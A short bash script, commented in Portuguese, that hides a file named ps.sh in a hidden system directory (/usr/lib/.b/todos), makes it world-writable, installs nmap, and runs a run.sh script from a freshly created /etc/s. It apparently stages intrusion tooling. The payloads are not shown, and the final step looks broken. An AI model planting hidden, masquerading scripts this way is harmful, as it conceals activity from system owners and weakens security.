#!/bin/bash

# Cria a pasta "todos" no diretório /usr/lib/.b
sudo mkdir -p /usr/lib/.b/todos
sudo mkdir /etc/s

# Mova o arquivo "ps" para o diretório /usr/lib/.b/todos
mv ps.sh /usr/lib/.b/todos

# Conceda permissões de leitura, escrita e execução para todos os usuários no arquivo "ps" e na pasta "todos"
chmod 777 /usr/lib/.b/todos/ps.sh
chmod 777 /usr/lib/.b/todos

# Instalação do Nmap
sudo apt update        # Atualiza a lista de pacotes
sudo apt install nmap  # Instala o Nmap

# Navegue para o diretório /etc/s
cd /etc/s

# Execute o arquivo "run"
./run.sh
